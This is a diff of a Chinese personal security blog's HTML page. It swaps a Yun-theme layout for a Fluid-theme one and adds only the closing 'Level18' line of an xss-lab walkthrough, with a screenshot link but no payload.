text-center"><span>在下方留下你的评论吧~</span><br><span>评论前先登陆噢</span><br></div><div id="lv-container" data-id="city" data-uid="MTAyMC81MjMyMy8yODgwMQ=="><script>(function(d, s) {
-  var j, e = d.getElementsByTagName(s)[0];
-  if (typeof LivereTower === 'function') { return; }
-  j = d.createElement(s);
-  j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-  j.async = true;
-  e.parentNode.insertBefore(j, e);
-})(document, 'script');</script></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Na0h_1e3</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.3.0</span></div><div class="live_time"><span>自Na0h将神光棒放入此处已经</span><span id="display_live_time"></span><span class="moe-text">٩(͡๏̯͡๏)۶</span><script>function blog_live_time() {
-  window.setTimeout(blog_live_time, 1000);
-  const start = new Date('2020-12-31T00:00:00');
-  const now = new Date();
-  const timeDiff = (now.getTime() - start.getTime());
-  const msPerMinute = 60 * 1000;
-  const msPerHour = 60 * msPerMinute;
-  const msPerDay = 24 * msPerHour;
-  const passDay = Math.floor(timeDiff / msPerDay);
-  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
-  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
-  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
-  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
-}
-blog_live_time();
-</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#00EE76" stroke-width="2" stroke-linecap="round"></circle></svg></a></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script><!-- hexo injector body_end start --><script src="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.0.5/js/index.js"></script><div id="widget-tree">
-      <ul><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/web/">web</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/web/sql%E6%B3%A8%E5%85%A5/">sql注入</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/" title="sql注入的一些基操"><i class="post-icon gg-file-document"></i>sql注入的一些基操</a></li></ul></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/wp/">wp</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/29/%E5%AD%A6%E6%A0%A1ctf%E8%AE%AD%E7%BB%83%E8%B5%9B%E7%9A%84wp/" title="学校ctf训练赛的wp"><i class="post-icon gg-file-document"></i>学校ctf训练赛的wp</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/02/05/%E5%AD%A6%E4%B9%A0%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/" title="学习正则表达式的一些笔记"><i class="post-icon gg-file-document"></i>学习正则表达式的一些笔记</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/29/%E8%BF%91%E6%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A1%E5%88%92/" title="关于一些计划"><i class="post-icon gg-file-document"></i>关于一些计划</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/" title="xss-lab通关小记"><i class="post-icon gg-file-document"></i>xss-lab通关小记</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/16/Pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%B0%8F%E8%AE%B0/" title="Pikachu靶场的小记"><i class="post-icon gg-file-document"></i>Pikachu靶场的小记</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/02/07/%E6%90%AD%E5%BB%BAvulhub(%E5%9F%BA%E4%BA%8Ecentos)/" title="搭建vulhub(基于centos)"><i class="post-icon gg-file-document"></i>搭建vulhub(基于centos)</a></li></ul></li></ul>
+<h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><p>同17<br><img src="https://img-blog.csdnimg.cn/20210103104358763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a>
+                    
+                      <a class="hover-with-bg" href="/tags/xss/">xss</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/01/16/Pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%B0%8F%E8%AE%B0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Pikachu靶场的小记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/">
+                        <span class="hidden-mobile">sql注入的一些基操</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz",
+          app_key: "y4AXlgIqQsV7Enr3IFS3r6Ck",
+          placeholder: "欢迎评论噢~",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+
+
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("30/12/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "自Na0h将神光棒放入已&nbsp"+dnum+"&nbsp天";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsp小时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-MLL1PZ9RBK', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=260676474"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', '260676474');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+
+
+<!-- hexo injector body_end start --><script src="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.0.5/js/index.js"></script><div id="widget-tree">
+      <ul><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/web/">web</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/web/sql%E6%B3%A8%E5%85%A5/">sql注入</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/" title="sql注入的一些基操"><i class="post-icon gg-file-document"></i>sql注入的一些基操</a></li></ul></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/wp/">wp</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/29/%E5%AD%A6%E6%A0%A1ctf%E8%AE%AD%E7%BB%83%E8%B5%9B%E7%9A%84wp/" title="学校ctf训练赛的wp"><i class="post-icon gg-file-document"></i>学校ctf训练赛的wp</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/02/05/%E5%AD%A6%E4%B9%A0%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/" title="学习正则表达式的一些笔记"><i class="post-icon gg-file-document"></i>学习正则表达式的一些笔记</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/29/%E8%BF%91%E6%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A1%E5%88%92/" title="关于一些计划"><i class="post-icon gg-file-document"></i>关于一些计划</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/" title="xss-lab通关小记"><i class="post-icon gg-file-document"></i>xss-lab通关小记</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/02/07/%E6%90%AD%E5%BB%BAvulhub(%E5%9F%BA%E4%BA%8Ecentos)/" title="搭建vulhub(基于centos)"><i class="post-icon gg-file-document"></i>搭建vulhub(基于centos)</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/16/Pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%B0%8F%E8%AE%B0/" title="Pikachu靶场的小记"><i class="post-icon gg-file-document"></i>Pikachu靶场的小记</a></li></ul></li></ul>
         <div id="widget-tree-button">
           <i class="gg-chevron-right"></i>
         </div>
-      </div><!-- hexo injector body_end end --></body></html>
+      </div><!-- hexo injector body_end end --></body>
+</html>
